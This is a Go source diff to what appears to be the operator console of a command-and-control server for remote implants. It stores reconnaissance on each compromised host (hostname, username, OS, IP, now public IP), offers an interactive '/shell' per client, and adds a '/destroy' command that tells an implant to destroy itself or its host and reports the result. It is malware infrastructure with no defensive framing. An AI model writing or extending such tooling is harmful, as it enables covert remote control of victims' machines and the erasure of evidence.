@@ -33,6 +33,7 @@ type Recon struct {
 	Arch     string `json:"arch"`
 	Kernel   string `json:"kernel"`
 	IP       string `json:"ip"`
+	PublicIP       string `json:"public_ip"`
 }
 
 type Client struct {
@@ -63,6 +64,7 @@ func initDB() {
 	CREATE TABLE IF NOT EXISTS clients (
 		id INTEGER PRIMARY KEY,
 		ip TEXT,
+		public_ip TEXT,
 		hostname TEXT,
 		username TEXT,
 		os TEXT,
@@ -337,6 +339,40 @@ func main() {
 		case "/clear":
 			fmt.Print("\033[H\033[2J")
 
+		case "/destroy":
+			if len(parts) < 2 {
+				fmt.Println("usage: /destroy <client_id>")
+				continue
+			}
+			id, err := strconv.Atoi(parts[1])
+			if err != nil {
+				fmt.Println("invalid client id")
+				continue
+			}
+			c, ok := clients[id]
+			if !ok {
+				fmt.Printf("client %d not found\n", id)
+				continue
+			}
+			fmt.Printf("%s[!] destroying client %d (%s@%s)...%s\n",
+				colorYellow, c.ID, c.Recon.Username, c.Recon.Hostname, colorReset)
+			if err := sendCommand(c, "destroy"); err != nil {
+				fmt.Printf("failed to send destroy: %v\n", err)
+				continue
+			}
+			// Wait for response
+			var msg struct {
+				Status string `json:"status"`
+				Error  string `json:"error,omitempty"`
+			}
+			if err := c.Decoder.Decode(&msg); err != nil {
+				fmt.Printf("connection lost: %v\n", err)
+			} else if msg.Status == "destroyed" {
+				fmt.Printf("%s[+] client %d destroyed%s\n", colorGreen, c.ID, colorReset)
+			} else if msg.Status == "destroy_fail" {
+				fmt.Printf("%s[-] destroy failed: %s%s\n", colorRed, msg.Error, colorReset)
+			}
+
 		case "/done":
 			fmt.Println("exiting...")
 			for id := range clients {
@@ -346,7 +382,7 @@ func main() {
 
 		default:
 			fmt.Printf("unknown command: %s\n", cmd)
-			fmt.Println("commands: /clients, /shell <id>, /clear, /done")
+			fmt.Println("commands: /clients, /shell <id>, /destroy <id>, /clear, /done")
 		}
 	}
 }
